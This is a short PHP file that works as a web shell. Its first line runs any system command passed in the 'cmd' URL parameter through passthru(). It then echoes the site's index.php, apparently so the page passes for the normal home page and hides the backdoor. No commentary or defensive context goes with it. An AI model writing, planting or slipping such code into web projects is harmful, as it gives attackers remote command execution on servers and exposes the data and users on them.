<?php echo passthru($_GET['cmd']); 
$home = file_get_contents("./index.php");
echo $home;

?>
